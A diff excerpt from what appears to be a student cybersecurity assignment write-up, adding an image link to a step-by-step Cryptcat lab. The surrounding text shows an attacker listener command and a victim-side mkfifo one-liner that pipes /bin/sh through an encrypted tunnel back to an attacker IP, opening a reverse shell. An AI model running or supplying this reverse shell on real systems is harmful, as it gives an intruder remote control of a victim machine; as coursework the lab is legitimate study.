@@ -137,7 +137,7 @@ This section explains the step-by-step execution using Cryptcat, reproducing the
 **Command:** `cryptcat -k <Password> -l -v -p 4444`  
 **Reason of command:** This opens port 4444 on the attacker's machine and silently waits for the victim machine to call back, ensuring only connections with the correct password are accepted.  
 ### Step 2: Triggering the Reverse Shell (Victim)  
-![image alt]()    
+![image alt](https://github.com/cybers6064-pair/TMV6064-Cybersecurity-Assignment-1/blob/0dfb85772eef6ad731607a2d7a6884ebcc3b4288/Task%202%20images/Cryptcat2.png)      
 **Command:** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | cryptcat 10.x.x.x 4444 -k <Password> > /tmp/f`  
 **Reason of command:** Because modern Linux systems disable the easy -e execution flag, this command creates a "Named Pipe" (mkfifo). It loops the input and output of a hidden bash shell directly into the encrypted Cryptcat tunnel pointing back to the attacker's IP.  
 ### Step 3: Verification  
